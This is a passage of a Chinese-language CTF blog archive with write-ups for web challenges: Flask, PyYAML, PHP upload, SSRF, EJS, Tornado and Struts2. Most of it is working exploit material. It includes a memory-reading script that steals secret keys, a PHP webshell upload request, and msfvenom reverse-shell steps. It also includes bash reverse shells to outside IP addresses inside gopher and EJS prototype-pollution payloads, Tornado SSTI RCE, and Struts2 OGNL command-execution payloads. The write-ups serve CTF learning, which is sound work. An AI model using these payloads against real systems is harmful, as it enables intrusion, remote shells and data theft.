模块，该模块提供了与操作系统交互的功能。\nos.execl('/bin/sh', 'sh', '-p')：这是要执行的 Python 代码。它使用 os.execl() 函数执行了一个系统命令。具体地说：\n'/bin/sh' 是要执行的程序的路径，即 Unix Shell 的路径。\n'sh' 是新程序的名称，通常是 Shell 的名称。\n'-p' 是传递给新程序的参数，这里表示以特权模式启动 Shell。\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693661431373-9a66c8fd-ce25-40a0-8847-bad7363150a5.png)\n\n##  ArkNights\n\n### 非预期解\n\n非预期了payload:`/read?file=/proc/1/environ`\n\n读环境变量就有\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693660447816-3625b299-1051-4a75-abc6-1443251980ad.png)\n\n### 预期解\n\n考点:\n\n- 通过/proc/self/mem内存获取secretkey\n- python的变量污染导致render可以目录穿越\n- 任意文件读取\n\n首先获得源码:\n\n```plain\nimport uuid\nfrom flask import *\nfrom werkzeug.utils import *\napp = Flask(__name__)\napp.config['SECRET_KEY'] =str(uuid.uuid4()).replace(\"-\",\"*\")+\"Boogipopisweak\"\n@app.route('/')\ndef index():\n    name=request.args.get(\"name\",\"name\")\n    m1sery=[request.args.get(\"m1sery\",\"Doctor.Boogipop\")]\n    if(session.get(\"name\")==\"Dr.Boog1pop\"):\n        blacklist=re.findall(\"/ba|sh|\\\\\\\\|\\[|]|#|system|'|\\\"/\", name, re.IGNORECASE)\n        if blacklist:\n            return \"bad hacker no way\"\n        exec(f'for [{name}] in [{m1sery}]:print(\"strange?\")')\n    else:\n        session['name'] = \"Doctor\"\n    return render_template(\"index.html\",name=session.get(\"name\"))\n@app.route('/read')\ndef read():\n        file = request.args.get('file')\n        fileblacklist=re.findall(\"/flag|fl|ag/\",file, re.IGNORECASE)\n        if fileblacklist:\n            return \"bad hacker!\"\n        start=request.args.get(\"start\",\"0\")\n        end=request.args.get(\"end\",\"0\")\n        if start==\"0\" and end==\"0\":\n            return open(file,\"rb\").read()\n        else:\n            start,end=int(start),int(end)\n            f=open(file,\"rb\")\n            f.seek(start)\n            data=f.read(end)\n            return data\n@app.route(\"/<path:path>\")\ndef render_page(path):\n    print(os.path.pardir)\n    print(path)\n    if not os.path.exists(\"templates/\" + path):\n        return \"not found\", 404\n    return render_template(path)\nif __name__=='__main__':\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\n首先就是去伪造session 老考点了 通过计算内存偏移量来读取内存中的secretkey\n\n读取`/proc/self/maps`可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。\n\n`/proc/self/mem`是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。\n\n脚本如下:\n\n```plain\nimport os\nimport  re\nimport requests\nurl=\"http://8.130.34.53:8848\"\nmaps_url = f\"{url}/read?file=/proc/self/maps\"\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\nprint(maps)\n#print(requests.get(maps_url).text)\nfor m in maps:\n    print(m)\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))\n    read_url = f\"{url}/read?file=/proc/self/mem&start={Offset}&end={Length}\"\n    s = requests.get(read_url).content\n    rt = re.findall(b\"[a-z0-9]{8}\\*[a-z0-9]{4}\\*[a-z0-9]{4}\\*[a-z0-9]{4}\\*[a-z0-9]{12}Boogipopisweak\", s)\n    print(rt)\n```\n\n然后就是我不知道的知识了 直接来看神のWP\n首先是python的一个黑魔法导致变量覆盖\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694011985226-0e294a99-187a-45f7-9268-6a56df3e24ad.png)\n\n所以利用点在这里:\n\n```plain\nexec(f'for [{name}] in [{m1sery}]:print(\"strange?\")')\n```\n\n其次我们是不是可以覆盖环境变量 当然神已经考虑到了：\n\n> 那么假如我们想覆盖环境变量可以怎么做呢？\n>\n> `[[str][0]for[os.environ['BASH_FUNC_echo%%']]in[['() { id; }']]]`\n>\n> 按照上述代码就可以覆盖环境变量，调用了os模块进行污染，如上代码可以rce输出id指令，但是我在题目里ban了，因此是不可行的。\n\n这里涉及到之前idek考的一个pydash原型链污染的非预期了，是通过污染`os.path.pardir`这个变量来允许目录穿越的，我们污染了os.path.pardir就可以实现路径穿越了 修改的值为任意 \n\n来自：https://tttang.com/archive/1876/#toc_ospathpardir\n\n至于为什么嘛 分析源码分析的 。。。。qwq？？？？？？？ 🐂 我记住结论了:)\n\n因此整个步骤为:\n\n1. 从内存中通过偏移量读取secretkey 伪造session\n2. 然后利用python黑魔法去污染os.path.pardir\n3. 路径穿越读flag\n\n环境给的flag位于/tmp/flag中 所以路径穿越即可 记得路径要url编码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694012734069-f27e4a64-739c-4798-bbba-e4a8545c51b6.png)\n\n真不错啊 学到知识好多！\n\n## ezyaml\n\n源码如下：\n\n```plain\nimport tarfile\nfrom flask import Flask, render_template, request, redirect\nfrom hashlib import md5\nimport yaml\nimport os\nimport re\n\n\napp = Flask(__name__)\n\ndef waf(s):  #设置waf\n    flag = True\n    blacklist = ['bytes','eval','map','frozenset','popen','tuple','exec','\\\\','object','listitems','subprocess','object','apply']\n    for no in blacklist:\n        if no.lower() in str(s).lower():\n            flag= False\n            print(no)\n            break\n    return flag\ndef extractFile(filepath, type):     \n\n    extractdir = filepath.split('.')[0]  #获取上传文件的文件名不包括后缀\n    if not os.path.exists(extractdir):\n        os.makedirs(extractdir)\n\n\n    if type == 'tar':\n        tf = tarfile.TarFile(filepath) #创建了一个 tarfile.TarFile 对象，用于操作tar压缩文件\n        tf.extractall(extractdir)  #将tar文件中的所有内容解压到指定的目录extractdir中\n        return tf.getnames()  #获取解压后的文件名列表并且返回\n\n@app.route('/', methods=['GET'])\ndef main():\n        fn = 'uploads/' + md5().hexdigest()  #创建文件上传路径初始化\n        if not os.path.exists(fn):\n            os.makedirs(fn)\n        return render_template('index.html')\n\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload():\n\n    if request.method == 'GET':\n        return redirect('/')\n\n    if request.method == 'POST':\n        upFile = request.files['file']\n        print(upFile)\n        if re.search(r\"\\.\\.|/\", upFile.filename, re.M|re.I) != None:  #匹配上传的文件名包不包括..或者/并且匹配多行和大小写\n            return \"<script>alert('Hacker!');window.location.href='/upload'</script>\"\n\n        savePath = f\"uploads/{upFile.filename}\"\n        print(savePath) \n        upFile.save(savePath) #保存文件\n\n        if tarfile.is_tarfile(savePath):  #用于检查给定的文件路径 savePath 是否是一个有效的tar压缩文件\n            zipDatas = extractFile(savePath, 'tar')\n            return render_template('result.html', path=savePath, files=zipDatas)\n        else:\n            return f\"<script>alert('{upFile.filename} upload successfully');history.back(-1);</script>\"\n\n\n@app.route('/src', methods=['GET'])\ndef src():\n    if request.args:\n        username = request.args.get('username')\n        with open(f'config/{username}.yaml', 'rb') as f: #打开yaml文件\n            Config = yaml.load(f.read()) #反序列化点\n            return render_template('admin.html', username=\"admin\", message=\"success\")\n    else:\n        return render_template('index.html')\n\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=8000)\n```\n\n大概分析在源码注释了 大致就需要我们进行一个路径穿越将我们上传后解压的文件穿越到`config/`这样我们的恶意文件才会被打开并且进行yaml反序列化\n\n考点：tar的zipslip文件覆盖，yaml反序列化\n\n文件内容为`!!python/object/apply:os.system [\"whoami\"]`改为反弹shell就行 来自https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonobjectapply 我愿称之为王の宝库\n\n之后就是打包了`tar cPvf a.tar ../../config/a.yaml`\n\n然后上传 访问/src路由 传参usename=a 即可触发反弹shell\n\n## Ez_java\n\n不会 没学\n\n## Ez_web\n\n考点：\n\n- /etc/ld.so.preload配置文件 劫持\n\n简单理解在这个文件中我们可以设置一些恶意的文件绝对路径\n\n然后在我们输入指令时 就会先预加载`ld.so.preload`这个文件中的内容 达到劫持效果\n\n所以这道大致题目思路:\n\n1. 先由msf生成一个木马 然后上传上去\n2. 然后在自己vps 起msfconsole 设置好相应的参数 开始监听等待反弹\n3. 然后在题目中随便执行一个指令就会被劫持了\n\n由于我没有环境只能大致复现一下 因为复现还给自己kali虚拟机整崩了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694094226089-5913781d-64aa-45ea-a2b2-59f67b604c93.jpeg)\n\n```plain\n#生成木马 这里有个点就是我只能在我vps的/root下生成木马 其他地方生成时都是permission denied 就算给了777都是这样\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=vps的ip LPORT=1000 -f elf-so -o evil.elf\n然后依次执行以下命令:\n#选择攻击载荷:\nuse payload/linux/x64/meterpreter/reverse_tcp \n#展示相关信息\nshow options\n#设置反弹接受shell的主机ip 这里设置成本机\nset lhost 0.0.0.0\n#监听ip 这里当时生成木马时端口是多少 就要设置成多少\nset lport 1000\n#开始执行利用\nexploit\n```\n\n参考于:\n\nhttps://blog.csdn.net/whatday/article/details/108890018\n\nhttps://www.anquanke.com/post/id/254388\n\n[http://162.14.111.237/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%ADlinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81/](http://162.14.111.237/应急响应中linux库文件劫持/)\n\nhttps://www.freebuf.com/column/162604.html\n\n都是上好的文章\n\n# Misc\n\n## EZ_misc\n\n跟之前*CTF考点一样 CVE-2023-28303\n\nhttps://github.com/frankthetank-music/Acropalypse-Multi-Tool 直接用工具梭哈恢复就行了\n","categories":["各赛事WP"]},{"title":"NSSCTF 2nd WP与学习","url":"/post/c7a57718.html","content":"\n学习\n\n<!--more-->\n\n# php签到\n\n```php\n<?php\n \n function waf($filename){\n     $black_list = array(\"ph\", \"htaccess\", \"ini\");\n     $ext = pathinfo($filename, PATHINFO_EXTENSION);\n     foreach ($black_list as $value) {\n         if (stristr($ext, $value)){\n             return false;\n         }\n     }\n     return true;\n }\n \n if(isset($_FILES['file'])){\n     $filename = urldecode($_FILES['file']['name']);\n     $content = file_get_contents($_FILES['file']['tmp_name']);\n     if(waf($filename)){\n         file_put_contents($filename, $content);\n     } else {\n         echo \"Please re-upload\";\n     }\n } else{\n     highlight_file(__FILE__);\n }\n```\n\n一道文件上传的题目，主要就是后缀名怎么去绕过pathinfo()函数\n\n参考以下文章\n\nhttps://www.freesion.com/article/7470682764/\n\nhttps://www.anquanke.com/post/id/253383\n\n> 在操作系统中，都是禁止使用/作为文件名的，但是不知道为什么后面加一个.就可以成功的写入1.php了。\n\n> $pathinfo[extension]=pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。\n\n 所以用`/.`绕过就行 记得要url编码一下\n\n```php\nPOST / HTTP/1.1\nHost: node6.anna.nssctf.cn:28316\nContent-Length: 332\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryznxIJaJoF11xMYcQ\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundaryznxIJaJoF11xMYcQ\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php%2F.\"\nContent-Type: application/octet-stream\n\nGIF89a\n<?php @eval($_POST['x']); ?>\n------WebKitFormBoundaryznxIJaJoF11xMYcQ\nContent-Disposition: form-data; name=\"submit\"\n\n提交\n------WebKitFormBoundaryznxIJaJoF11xMYcQ--\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693108794590-ca64554b-c13d-4a28-b22a-be5854ad5ec9.png)\n\n上传成功后 就是rce即可\n\n# 2周年快乐！\n\n进入题目中win12系统 用里面的cmd发个`curl https://www.nssctf.cn/flag`就能在nss站内收到flag邮件了\n\n# MyBox\n\n非预期了 直接`file:///proc/1/environ`flag就在环境变量中\n\n# MyBox(revenge)\n\n一道gopher协议 打apache2.4.49 ssrf+路径穿越RCE的题目\n\n做题根本想不到\n\n首先`file:///app/app.py`获得源码\n\n```javascript\nfrom flask import Flask, request, redirect\nimport requests, socket, struct\nfrom urllib import parse\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    if not request.args.get('url'):\n        return redirect('/?url=dosth')\n    url = request.args.get('url')\n    if url.startswith('file://'):\n        if 'proc' in url or 'flag' in url:\n            return 'no!'\n        with open(url[7:], 'r') as f:\n            data = f.read()\n            if url[7:] == '/app/app.py':\n                return data\n            if 'NSSCTF' in data:\n                return 'no!'\n            return data\n    elif url.startswith('http://localhost/'):\n        return requests.get(url).text\n    elif url.startswith('mybox://127.0.0.1:'):\n        port, content = url[18:].split('/_', maxsplit=1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect(('127.0.0.1', int(port)))\n        s.send(parse.unquote(content).encode())\n        res = b''\n        while 1:\n            data = s.recv(1024)\n            if data:\n                res += data\n            else:\n                break\n        return res\n    return ''\n\napp.run('0.0.0.0', 827)\n```\n\n先发包看看80端口 偷的大佬的\n\n```plain\nmybox://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25200%250D%250A%250D%250A%250D%250A\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693302700270-2d5a5ce7-2e33-42ce-97bd-3b9900eb3611.png)\n\n显示apahce2.4.49 然后是一个gopher+路径穿越rce\n\n参考：https://classic0796.com/index.php/archives/6/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693305404147-d17547c7-5ee8-49b1-a441-776cbe6dc0ca.jpeg)\n\n可以构造这种请求包来rce\n\n直接用god脚本 不用手动去构造`%0D%0A` \n\n还有一个小点是那个`_` 一定要加不然会将之后数据第一个字符吞了 参考:https://cloud.tencent.com/developer/article/1610645\n\n还有一个小点就是我们都知道三个双引号或者单引号在python中是注释符 但是也可以被当作用来括普通字符串的qwq\n\n```javascript\nfrom urllib.parse import quote\ntest =\\\n\"\"\"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: curl/7.68.0\nContent-Length:59\n\necho;bash -c \"bash -i >& /dev/tcp/8.130.34.53/7777 <&1\"\n\"\"\"\n#http://node6.anna.nssctf.cn:28949/?url=mybox://127.0.0.1:80/_POST%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520curl/7.68.0%250D%250AContent-Length%253A59%250D%250A%250D%250Aecho%253Bbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/114.116.119.253/7777%2520%253C%25261%2522%250D%250A\ntmp = quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nprint(new)\nresult='_'+quote(new)\n#post\n#result = '_'+new\ncommon=\"gopher://127.0.0.1:80/\"\nprint(quote(common)+result)\n```\n\n# MyJs\n\n源码如下：\n\n```javascript\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst lodash = require('lodash');\nconst session = require('express-session');\nconst randomize = require('randomatic');\nconst jwt = require('jsonwebtoken')\nconst crypto = require('crypto');\nconst fs = require('fs');\n\nglobal.secrets = [];\n\nexpress()\n  .use(bodyParser.urlencoded({extended: true}))\n  .use(bodyParser.json())\n  .use('/static', express.static('static'))\n  .set('views', './views')\n  .set('view engine', 'ejs')\n  .use(session({\n    name: 'session',\n    secret: randomize('a', 16),\n    resave: true,\n    saveUninitialized: true\n  }))\n  .get('/', (req, res) => {\n    if (req.session.data) {\n      res.redirect('/home');\n    } else {\n      res.redirect('/login')\n    }\n  })\n  .get('/source', (req, res) => {\n    res.set('Content-Type', 'text/javascript;charset=utf-8');\n    res.send(fs.readFileSync(__filename));\n  })\n  .all('/login', (req, res) => {\n    if (req.method == \"GET\") {\n      res.render('login.ejs', {msg: null});\n    }\n    if (req.method == \"POST\") {\n      const {username, password, token} = req.body;\n      const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n      if (sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n        return res.render('login.ejs', {msg: 'login error.'});\n      }\n      const secret = global.secrets[sid];\n      const user = jwt.verify(token, secret, {algorithm: \"HS256\"});\n      if (username === user.username && password === user.password) {\n        req.session.data = {\n          username: username,\n          count: 0,\n        }\n        res.redirect('/home');\n      } else {\n        return res.render('login.ejs', {msg: 'login error.'});\n      }\n    }\n  })\n  .all('/register', (req, res) => {\n    if (req.method == \"GET\") {\n      res.render('register.ejs', {msg: null});\n    }\n    if (req.method == \"POST\") {\n      const {username, password} = req.body;\n      if (!username || username == 'nss') {\n        return res.render('register.ejs', {msg: \"Username existed.\"});\n      }\n      const secret = crypto.randomBytes(16).toString('hex');\n      const secretid = global.secrets.length;\n      global.secrets.push(secret);\n      const token = jwt.sign({secretid, username, password}, secret, {algorithm: \"HS256\"});\n      res.render('register.ejs', {msg: \"Token: \" + token});\n    }\n  })\n  .all('/home', (req, res) => {\n    if (!req.session.data) {\n      return res.redirect('/login');\n    }\n    res.render('home.ejs', {\n      username: req.session.data.username||'NSS',\n      count: req.session.data.count||'0',\n      msg: null\n    })\n  })\n  .post('/update', (req, res) => {\n    if(!req.session.data) {\n      return res.redirect('/login');\n    }\n    if (req.session.data.username !== 'nss') {\n      return res.render('home.ejs', {\n        username: req.session.data.username||'NSS',\n        count: req.session.data.count||'0',\n        msg: 'U cant change uid'\n      })\n    }\n    let data = req.session.data || {};\n    req.session.data = lodash.merge(data, req.body);\n    console.log(req.session.data.outputFunctionName);\n    res.redirect('/home');\n  })\n  .listen(827, '0.0.0.0')\n```\n\n先是ejs空密钥缺陷  先注册获取一个时间戳\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693295357231-d4fb9748-a150-45a3-9899-f1196b7d9dd1.png)\n\nsid为token中的secretid，直接取数组让其报错为undefined\n\n看大佬师傅的博客是因为jwt空算法攻击导致可伪造\n\n官方：\n\n1. verify时正确的参数是algorithms而不是algorithm，所以这里本质传了个空加密，导致允许空密钥，我们无须获得JWT密钥（高版本已修改）。\n2. 第二个是关于sid的弱比较，如果只是允许空密钥的话我们不知道secret依然无法verify，这里sid如果传个数组就能轻松绕过判断并且\n   ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693370732570-c47d2a3a-0bca-483f-9443-c9ff1a6eb437.png)\n\n然后本地构造一个nss账号的token\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693293966734-19bd978f-198a-40c5-b080-5763ae755c45.png)\n\n然后登录 可以看到/update路由下存在原型链污染 之后就是去找链子 没找到。。。。低能\n\n```javascript\npost('/update', (req, res) => {\n    if(!req.session.data) {\n      return res.redirect('/login');\n    }\n    if (req.session.data.username !== 'nss') {\n      return res.render('home.ejs', {\n        username: req.session.data.username||'NSS',\n        count: req.session.data.count||'0',\n        msg: 'U cant change uid'\n      })\n    }\n    let data = req.session.data || {};\n    req.session.data = lodash.merge(data, req.body);\n    console.log(req.session.data.outputFunctionName);\n    res.redirect('/home');\n  })\n```\n\n是高版本ejs3.1.7的链子 终于找到出处了https://inhann.top/2023/03/26/ejs/ 还是个cve 妈的CVE-2022-29078\n\n```javascript\n{\"__proto__\":{\n  \"settings\":{\n    \"view options\":{\n      \"escapeFunction\":\"console.log;this.global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/8.130.34.53/7777 <&1\\\"');\",\n      \"client\":\"true\"\n    }\n}\n  }\n}\n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693300087149-8b21e202-2dc4-45b3-87c9-373819daf28d.png)\n\n# MyHurricane\n\n源码如下\n\n```javascript\nimport tornado.ioloop\nimport tornado.web\nimport os\n\nBASE_DIR = os.path.dirname(__file__)\n\ndef waf(data):\n    bl = ['\\'', '\"', '__', '(', ')', 'or', 'and', 'not', '{{', '}}']\n    for c in bl:\n        if c in data:\n            return False\n    for chunk in data.split():\n        for c in chunk:\n            if not (31 < ord(c) < 128):\n                return False\n    return True\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        with open(__file__, 'r') as f:\n            self.finish(f.read())\n    def post(self):\n        data = self.get_argument(\"ssti\")\n        if waf(data):\n            with open('1.html', 'w') as f:\n                f.write(f\"\"\"<html>\n                        <head></head>\n                        <body style=\"font-size: 30px;\">{data}</body></html>\n                        \"\"\")\n                f.flush()\n            self.render('1.html')\n        else:\n            self.finish('no no no')\n\nif __name__ == \"__main__\":\n    app = tornado.web.Application([\n            (r\"/\", IndexHandler),\n        ], compiled_template_cache=False)\n    app.listen(827)\n    tornado.ioloop.IOLoop.current().start()\n```\n\n一眼丁真是tornado的ssti了  payload大致上和我们学习flask ssti一样 都有稍有不同\n\nwaf了 `['\\'', '\"', '__', '(', ')', 'or', 'and', 'not', '{{', '}}']`\n\n我死在了括号上 当时在想连括号都waf了 怎么了构造payload啊\n\n之后发现大佬们根本不用括号。。。。\n\n还有就是又有非预期\n\n## 非预期\n\n直接用文件包含\n\n```\n{% extend /proc/self/environ %}\n```\n\n或者`{% include /proc/self/environ %}` 当然记得url编码打入\n\n## 预期\n\n还有另一种是god 的payload\n\n```javascript\nssti={%25 set _tt_utf8 =eval %25}{%25 raw request.body_arguments[request.method][0] %25}&POST=__import__('os').popen(\"bash -c 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261'\")\n```\n\n> 这种方法利用了tornado里的变量覆盖，让__tt_utf8为eval，在渲染时时会有__tt_utf8(__tt_tmp)这样的调用，然后让__tt_tmp为恶意字符串就好了，我fuzz了一下，上述payload中raw语句可以给tmp赋值，所以rce\n\n`{% raw *expr* %}`：就是常规的模板语句，只是输出不会被转义\n\n`request.body_arguments`：request.body_arguments 是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求中的表单数据或URL编码数据。\n\n在 HTTP 请求中，请求体（body）通常用于传输 POST 请求中的表单数据或 URL 编码数据。request.body_arguments 可以解析并返回这些数据的字典形式。\n\n`request.method`是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求的请求方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693307041761-05276fd0-0b48-4d6a-ac04-e3d5e644a066.png)\n\n来自:[https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#%E5%88%A9%E7%94%A8-httpserverrequest](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#利用-httpserverrequest)\n\n真的太强了qwq 又学到新姿势了\n","categories":["各赛事WP"]},{"title":"ctfshow-java struts2框架一览","url":"/post/faf20676.html","content":"\nctfshow-java\n\n<!--more-->\n\n# 前言\n\n硬着头皮学习\n\n好像这个系列讲的全是struts2框架漏洞 就当作是长见识了\n\nStruts2是java语言写的的一个基于MVC设计模式的Web框架\n\nstruts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，`%{value}`并重新填充相应的表单数据。\n\n这里的`%{value}`简单理解就是和flask的模板注入`{{}}`差不多 会对里面的内容进行解析\n\n因此我们可以利用其进行命令执行\n\nOGNL表达式中三个符号 `% # $` 的含义\n\n```plain\n%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值\n#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用\n$主要是在Struts 2配置文件中，引用OGNL表达式\n```\n\n其次struts2引擎是我们熟悉的tomcat\n\ngithub上有专门针对struts2的poc https://github.com/HatBoy/Struts2-Scan 不过我还是自己手动捯饬一下\n\n# WEB-279(S2-001)\n\n获取一些敏感路径的payload:\n\n```plain\n// 获取tomcat路径\n%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n\n// 获取web路径\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}\n```\n\n本题payload:\n\n```plain\n// 命令执行 env，flag在环境变量中\npassword=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"env\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1\n```\n\n# WEB-280(S2-016和S2-005)\n\nS2-003\n\n```plain\nStruts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果\n\n影响版本：Struts 2.0.0 - Struts 2.0.11.2\n```\n\n因此我们可以利用unicode编码和8进制来bypass `#`\n\n这道题目只能用这个poc做出来 网上的payload都没有回显 https://github.com/wyzmgmdg/Struts2Scan\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png)\n\n然后S2-016和S2-005都能打通\n\n或者\n\npost传参\n\n```plain\nredirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%65%6e%76%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}\n```\n\n需要注意的是我们的命令必须要经过url全字符编码才能成功 也就是我标蓝这里 途中命令为env\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692947661826-dd0d571e-eef9-4a67-a9c4-7c26bac99054.png)\n\n参考:https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md\n\n# WEB-281(S2-007)\n\n原理:\n\n当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回\n\n当用户 age 以str而不是的形式提交时 int，服务器将拼接 `“‘“ + value + “‘“ `代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码\n\n影响版本：Struts2 2.0.0 - Struts2 2.2.3\n\npayload：\n\n```plain\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '\n```\n\n# WEB-282(S2-008)\n\n原理:\n\nS2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。\n\n影响版本：Struts 2.1.0 – 2.3.1\n\n\n\n这道题目很奇怪只能用上面的poc脚本才能打成功 看了脚本的构造 payload如下\n\n手动输入就是没有回显 反弹shell也是一样\n\n```plain\n/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cmd%27%29.getInputStream%28%29%29)\n```\n\n# WEB-283(Struts2 